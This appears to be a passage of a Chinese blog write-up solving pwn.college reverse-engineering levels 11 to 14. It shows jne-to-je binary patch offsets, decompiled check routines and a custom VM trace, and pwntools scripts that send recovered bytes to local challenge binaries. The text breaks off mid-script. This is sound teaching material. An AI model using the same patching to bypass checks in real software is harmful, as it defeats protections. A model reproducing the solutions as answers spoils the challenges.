<h4 id="level11-0"><a href="#level11-0" class="headerlink" title="level11.0"></a>level11.0</h4><p>思路一致，只不过这时需要修改的是两个jne指令为jn指令，所以需要找到两个偏移量。还是按照前面题目的思路，找到的两个偏移量为：<code>0x2857</code>和<code>0x2ae9</code></p>
<h4 id="level11-1"><a href="#level11-1" class="headerlink" title="level11.1"></a>level11.1</h4><p>还是老套路，这次没有符号了。依然可以gdb调试拿到偏移量：<code>0x197b+1</code>和<code>0x1a5a</code>。</p>
<p>为什么要+1？是因为通过ida pro打开源程序后，发现它是带符号的opcode，因此查阅后需要将<code>OF 85</code>改成<code>OF 84</code>，所以，需要+1修改后面那个字节的值。而后面那个偏移不需要+1因为它时不带符号的opcode。因此后面的偏移值改成74即可。</p>
<h4 id="level12-0"><a href="#level12-0" class="headerlink" title="level12.0"></a>level12.0</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall __noreturn <span class="hljs-title function_">execute_program</span><span class="hljs-params">(_BYTE *a1)</span>		<span class="hljs-comment">// al指向一个全为0的char数组，长度为256字节。</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">size_t</span> v3; <span class="hljs-comment">// rax</span><br>  _BOOL4 v4; <span class="hljs-comment">// [rsp+1Ch] [rbp-94h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">136</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-90h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+A8h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  read(<span class="hljs-number">0</span>, a1 + <span class="hljs-number">67</span>, <span class="hljs-number">6uLL</span>);			 <span class="hljs-comment">// 接收用户输入的6个字节，从char[67]开始</span><br>  a1[<span class="hljs-number">99</span>] = <span class="hljs-number">18</span>;<br>  a1[<span class="hljs-number">100</span>] = <span class="hljs-number">-84</span>;<br>  a1[<span class="hljs-number">101</span>] = <span class="hljs-number">-73</span>;<br>  a1[<span class="hljs-number">102</span>] = <span class="hljs-number">-78</span>;<br>  a1[<span class="hljs-number">103</span>] = <span class="hljs-number">-91</span>;<br>  a1[<span class="hljs-number">104</span>] = <span class="hljs-number">26</span>;<br>  v1 = <span class="hljs-built_in">memcmp</span>(a1 + <span class="hljs-number">99</span>, a1 + <span class="hljs-number">67</span>, <span class="hljs-number">6uLL</span>);<br>  v4 = v1 == <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( v1 )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;INCORRECT!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;CORRECT! Your flag: &quot;</span>);<br>    v2 = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">0</span>);<br>    v3 = read(v2, buf, <span class="hljs-number">0x64u</span>LL);<br>    write(<span class="hljs-number">1</span>, buf, v3);<br>  &#125;<br>  <span class="hljs-built_in">exit</span>(!v4);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>将al数组&#x3D;[18, -84, -73, -78, -91, -26]使用python中的<code>struct.pack</code>打包成字节序，然后发送给目标程序就行了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;/challenge/babyrev-level-12-0&#x27;</span>)<br>al = [<span class="hljs-number">18</span>, -<span class="hljs-number">84</span>, -<span class="hljs-number">73</span>, -<span class="hljs-number">78</span>, -<span class="hljs-number">91</span>, <span class="hljs-number">26</span>]<br><br>payload = struct.pack(<span class="hljs-string">&#x27;6b&#x27;</span>, *al)<br><span class="hljs-built_in">print</span>(payload)<br>p.send(payload)<br><span class="hljs-built_in">print</span>(p.readall())<br></code></pre></td></tr></table></figure>

<blockquote>
<p>struct.pack说明：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">struct.pack(fmt, v1, v2, ...)<br></code></pre></td></tr></table></figure>

<ul>
<li><code>fmt</code>：格式字符串，指定如何将数据打包成二进制。格式字符串由字符组成，每个字符表示一种数据类型。</li>
<li><code>v1,v2,...</code>：要打包的数据，可以是整数、浮点数、字符串等。</li>
</ul>
<p>格式字符串<code>fmt</code>由字节顺序(<code>@,=,&lt;,&gt;,!</code>)和数据类型(<code>c,b,B,?,h,H,i,I,l,L,q,Q,f,d,s,p,x</code>)组成。其中字节顺序可选，<code>@</code>默认，使用本地字节顺序、大小和对齐方式。<code>=</code>使用本地字节序，标准大小，无对其。<code>&lt;</code>小端模式，<code>&gt;</code>大端模式，<code>!</code>网络字节序（大端模式）。后续的数据类型常见的有：</p>
<p><code>c</code>：字符；<code>b</code>：有符号字节；<code>B</code>：无符号字节；<code>h</code>：有符号短整型；<code>H</code>：无符号短整型；<code>i</code>：有符号整型；<code>I</code>：无符号整型；<code>s</code>：字符串，需要指定长度，例如<code>10s</code>表示10字节的字符串</p>
</blockquote>
<h4 id="level12-1"><a href="#level12-1" class="headerlink" title="level12.1"></a>level12.1</h4><p>同理</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;/challenge/babyrev-level-12-1&#x27;</span>)<br>al = [<span class="hljs-number">61</span>,<span class="hljs-number">118</span>,-<span class="hljs-number">61</span>,-<span class="hljs-number">110</span>]<br><br>payload = struct.pack(<span class="hljs-string">&#x27;4b&#x27;</span>, *al)<br><span class="hljs-built_in">print</span>(payload)<br>p.send(payload)<br><span class="hljs-built_in">print</span>(p.readall())<br></code></pre></td></tr></table></figure>

<h4 id="level13-0"><a href="#level13-0" class="headerlink" title="level13.0"></a>level13.0</h4><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs armasm">[s] IMM <span class="hljs-keyword">b</span> = <span class="hljs-number">0x71</span><br>[s] IMM c = <span class="hljs-number">0x1</span><br>[s] IMM a = <span class="hljs-number">0xbd</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a				# <span class="hljs-built_in">a1</span>[<span class="hljs-number">0x71</span>] = <span class="hljs-number">0xbd</span><br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0xb5</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a				# <span class="hljs-built_in">a1</span>[<span class="hljs-number">0x72</span>] = <span class="hljs-number">0xb5</span> <br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0xd8</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a				# <span class="hljs-built_in">a1</span>[<span class="hljs-number">0x73</span>] = <span class="hljs-number">0xd8</span><br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0xdc</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a				# <span class="hljs-built_in">a1</span>[<span class="hljs-number">0x74</span>] = <span class="hljs-number">0xdc</span><br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0xbd</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a				# <span class="hljs-built_in">a1</span>[<span class="hljs-number">0x75</span>] = <span class="hljs-number">0xbd</span><br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0x98</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a				# <span class="hljs-built_in">a1</span>[<span class="hljs-number">0x76</span>] = <span class="hljs-number">0x98</span><br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br></code></pre></td></tr></table></figure>

<p>可以看到是一系列寄存器&#x2F;立即数的操作。题目要求输入6个字节。 而上述正好是从<code>a1[113]</code>开始，写入了6个字节。因此，我们把这6个字节转换成字节序丢给它即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;/challenge/babyrev-level-13-0&#x27;</span>)<br>al = [<span class="hljs-number">0xbd</span>,<span class="hljs-number">0xb5</span>,<span class="hljs-number">0xd8</span>,<span class="hljs-number">0xdc</span>,<span class="hljs-number">0xbd</span>,<span class="hljs-number">0x98</span>]<br><br>payload = struct.pack(<span class="hljs-string">&#x27;6B&#x27;</span>, *al)<br><span class="hljs-built_in">print</span>(payload)<br>p.send(payload)<br><span class="hljs-built_in">print</span>(p.readall())<br></code></pre></td></tr></table></figure>

<h4 id="level13-1"><a href="#level13-1" class="headerlink" title="level13.1"></a>level13.1</h4><p>现在，题目不会打印出汇编伪代码了。就得自己通过ida 看出来。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sub_1533</span>(a1, <span class="hljs-number">1</span>LL, <span class="hljs-number">91</span>LL);			<br><span class="hljs-attribute">sub_1533</span>(a1, <span class="hljs-number">8</span>LL, <span class="hljs-number">1</span>LL);			<br><span class="hljs-attribute">sub_1533</span>(a1, <span class="hljs-number">2</span>LL, <span class="hljs-number">70</span>LL);			<br><span class="hljs-attribute">sub_1687</span>(a1, <span class="hljs-number">1</span>LL, <span class="hljs-number">2</span>LL);			<br><span class="hljs-attribute">sub_1568</span>(a1, <span class="hljs-number">1</span>LL, <span class="hljs-number">8</span>LL);			<br><span class="hljs-attribute">sub_1533</span>(a1, <span class="hljs-number">2</span>LL, <span class="hljs-number">236</span>LL);<br><span class="hljs-attribute">sub_1687</span>(a1, <span class="hljs-number">1</span>LL, <span class="hljs-number">2</span>LL);<br><span class="hljs-attribute">sub_1568</span>(a1, <span class="hljs-number">1</span>LL, <span class="hljs-number">8</span>LL);<br><span class="hljs-attribute">sub_1533</span>(a1, <span class="hljs-number">2</span>LL, <span class="hljs-number">45</span>LL);<br><span class="hljs-attribute">sub_1687</span>(a1, <span class="hljs-number">1</span>LL, <span class="hljs-number">2</span>LL);<br><span class="hljs-attribute">sub_1568</span>(a1, <span class="hljs-number">1</span>LL, <span class="hljs-number">8</span>LL);<br><span class="hljs-attribute">sub_1533</span>(a1, <span class="hljs-number">2</span>LL, <span class="hljs-number">101</span>LL);<br><span class="hljs-attribute">sub_1687</span>(a1, <span class="hljs-number">1</span>LL, <span class="hljs-number">2</span>LL);<br><span class="hljs-attribute">sub_1568</span>(a1, <span class="hljs-number">1</span>LL, <span class="hljs-number">8</span>LL);<br></code></pre></td></tr></table></figure>

<p>看了看，要手工调出来得好久，还容易出错。还是写代码快：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>a1 = np.zeros((<span class="hljs-number">512</span>,<span class="hljs-number">1</span>), dtype=<span class="hljs-built_in">int</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_1533</span>(<span class="hljs-params">a2,a3</span>):<br>    <span class="hljs-keyword">return</span> sub_1415(a2,a3)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_1415</span>(<span class="hljs-params">a2, a3</span>):<br>    result = []<br>    <span class="hljs-keyword">match</span> a2:<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            result = a1<br>            a1[<span class="hljs-number">256</span>] = a3<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            result = a1<br>            a1[<span class="hljs-number">257</span>] = a3<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>            result = a1<br>            a1[<span class="hljs-number">258</span>] = a3<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">32</span>:<br>            result = a1<br>            a1[<span class="hljs-number">259</span>] = a3<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>            result = a1<br>            a1[<span class="hljs-number">260</span>] = a3              <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">16</span>:<br>            result = a1<br>            a1[<span class="hljs-number">261</span>] = a3     <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">64</span>:<br>            result = a1<br>            a1[<span class="hljs-number">262</span>] = a3     <br>        <span class="hljs-keyword">case</span> _:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;unknown register&quot;</span>)<br>            exit()<br>    <span class="hljs-keyword">return</span> result<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_1687</span>(<span class="hljs-params">a2, a3</span>):<br>    v3 = sub_1363(a3)<br>    v4 = sub_1363(a2)<br>    <span class="hljs-keyword">return</span> sub_1507(v4, v3)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_1363</span>(<span class="hljs-params">a2</span>):<br>    res = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">match</span> a2:<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">256</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">257</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">258</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">32</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">259</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">260</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">16</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">261</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">64</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">262</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_1507</span>(<span class="hljs-params">a2, a3</span>):<br>    res = a2<br>    a1[a2] = a3<br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_1568</span>(<span class="hljs-params">a2, a3</span>):<br>    v3 = sub_1363(a2)<br>    v4 = sub_1363(a3)<br>    <span class="hljs-keyword">return</span> sub_1415(a2, v3+v4)<br><br><br>sub_1533(<span class="hljs-number">1</span>, <span class="hljs-number">91</span>)<br>sub_1533(<span class="hljs-number">8</span>, <span class="hljs-number">1</span>)<br>sub_1533(<span class="hljs-number">2</span>, <span class="hljs-number">70</span>)<br>sub_1687(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>sub_1568(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>)<br>sub_1533(<span class="hljs-number">2</span>, <span class="hljs-number">236</span>)<br>sub_1687(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>sub_1568(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>)<br>sub_1533(<span class="hljs-number">2</span>, <span class="hljs-number">45</span>)<br>sub_1687(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>sub_1568(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>)<br>sub_1533(<span class="hljs-number">2</span>, <span class="hljs-number">101</span>)<br>sub_1687(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>sub_1568(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    <span class="hljs-built_in">print</span>(a1[<span class="hljs-number">91</span>+i])<br></code></pre></td></tr></table></figure>

<p>最后exp就是之前的模板：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;/challenge/babyrev-level-13-1&#x27;</span>)<br>al = [<span class="hljs-number">70</span>,<span class="hljs-number">236</span>,<span class="hljs-number">45</span>,<span class="hljs-number">101</span>]<br><br>payload = struct.pack(<span class="hljs-string">&#x27;4B&#x27;</span>, *al)<br><span class="hljs-built_in">print</span>(payload)<br>p.send(payload)<br><span class="hljs-built_in">print</span>(p.readall())<br></code></pre></td></tr></table></figure>



<h4 id="level14-0"><a href="#level14-0" class="headerlink" title="level14.0"></a>level14.0</h4><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs csharp">[<span class="hljs-meta">s</span>] IMM b = <span class="hljs-number">0x36</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x6</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0</span><br>[<span class="hljs-meta">s</span>] SYS <span class="hljs-number">0x2</span> a<br>[<span class="hljs-meta">s</span>] ... read_memory<br>[<span class="hljs-meta">s</span>] ... <span class="hljs-keyword">return</span> <span class="hljs-keyword">value</span> (<span class="hljs-keyword">in</span> register a): <span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] IMM b = <span class="hljs-number">0x56</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x1</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x14</span><br>[<span class="hljs-meta">s</span>] STM *b = a						<span class="hljs-meta"># a1[0x56] = 0x14</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0xd2</span><br>[<span class="hljs-meta">s</span>] STM *b = a						<span class="hljs-meta"># a1[0x57] = 0xd2</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0xcf</span><br>[<span class="hljs-meta">s</span>] STM *b = a						<span class="hljs-meta"># a1[0x58] = 0xcf</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x31</span><br>[<span class="hljs-meta">s</span>] STM *b = a						<span class="hljs-meta"># a1[0x59] = 0x31</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x54</span><br>[<span class="hljs-meta">s</span>] STM *b = a						<span class="hljs-meta"># a1[0x5a] = 0x54</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0xb8</span><br>[<span class="hljs-meta">s</span>] STM *b = a						<span class="hljs-meta"># a1[0x5b] = 0xb8</span><br>[<span class="hljs-meta">s</span>] ADD b c<br></code></pre></td></tr></table></figure>

<p>老规矩，第一关还是会打印出来。那么我们直接简单推导一下就行了。exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;/challenge/babyrev-level-14-0&#x27;</span>)<br>al = [<span class="hljs-number">0x14</span>,<span class="hljs-number">0xd2</span>,<span class="hljs-number">0xcf</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x54</span>,<span class="hljs-number">0xb8</span>]<br><br>payload = struct.pack(<span class="hljs-string">&#x27;6B&#x27;</span>, *al)<br><span class="hljs-built_in">print</span>(payload)<br>p.send(payload)<br><span class="hljs-built_in">print</span>(p.readall())<br><br></code></pre></td></tr></table></figure>



<h4 id="level14-1"><a href="#level14-1" class="headerlink" title="level14.1"></a>level14.1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>a1 = np.zeros((<span class="hljs-number">512</span>,<span class="hljs-number">1</span>), dtype=<span class="hljs-built_in">int</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_1533</span>(<span class="hljs-params">a2,a3</span>):<br>    <span class="hljs-keyword">return</span> sub_1415(a2,a3)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_1415</span>(<span class="hljs-params">a2, a3</span>):<br>    result = []<br>    <span class="hljs-keyword">match</span> a2:<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            result = a1<br>            a1[<span class="hljs-number">256</span>] = a3<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            result = a1<br>            a1[<span class="hljs-number">257</span>] = a3<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>            result = a1<br>            a1[<span class="hljs-number">258</span>] = a3<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">32</span>:<br>            result = a1<br>            a1[<span class="hljs-number">259</span>] = a3<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>            result = a1<br>            a1[<span class="hljs-number">260</span>] = a3              <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">16</span>:<br>            result = a1<br>            a1[<span class="hljs-number">261</span>] = a3     <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">64</span>:<br>            result = a1<br>            a1[<span class="hljs-number">262</span>] = a3     <br>        <span class="hljs-keyword">case</span> _:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;unknown register&quot;</span>)<br>            exit()<br>    <span class="hljs-keyword">return</span> result<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_1687</span>(<span class="hljs-params">a2, a3</span>):<br>    v3 = sub_1363(a3)<br>    v4 = sub_1363(a2)<br>    <span class="hljs-keyword">return</span> sub_1507(v4, v3)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_1363</span>(<span 